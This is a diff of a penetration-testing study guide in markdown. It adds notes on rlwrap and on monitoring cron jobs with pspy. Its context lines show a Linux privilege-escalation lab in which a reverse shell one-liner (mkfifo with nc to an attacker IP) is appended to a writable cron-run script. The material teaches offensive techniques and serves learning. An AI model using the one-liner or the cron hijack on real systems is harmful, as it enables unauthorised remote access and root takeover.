@@ -1050,7 +1050,7 @@ nt authority\system
 ```
 
 > **Note:** 
-> This may only work if inside a `rlwrap` session. Otherwise try to run a reverse shell executable instead of cmd.
+> This may only work if inside a `rlwrap` session (and only in one between CMD or PS, don't remember which). Otherwise try to run a reverse shell executable instead of cmd.
 ## Linux Privilege Escalation Examples
 ### Insecure File Permissions: Cron Case Study
 - In order to leverage insecure file permissions, we must locate an executable file that not only allows us write access but also runs at an elevated privilege level.
@@ -1065,6 +1065,10 @@ Inserting a reverse shell one-liner in a scheduled bash script
 student@debian:/var/scripts$ echo >> user_backups.sh 
 student@debian:/var/scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $our_IP 1234 >/tmp/f" >> user_backups.sh
 ```
+  
+> **Note**:
+> Take a look at this resource [Exploiting the cron jobs misconfigurations](https://vk9-sec.com/exploiting-the-cron-jobs-misconfigurations-privilege-escalation/).
+> Use [PsPy](https://github.com/DominicBreuker/pspy) to monitor system processes and undertand how frequently a job is running.
 ### Insecure File Permissions
 #### /etc/shadow Case Study
 - Unless a centralized credential system such as Active Directory or LDAP is used, Linux passwords are generally stored in **`/etc/shadow`**, which is not readable by normal users. 
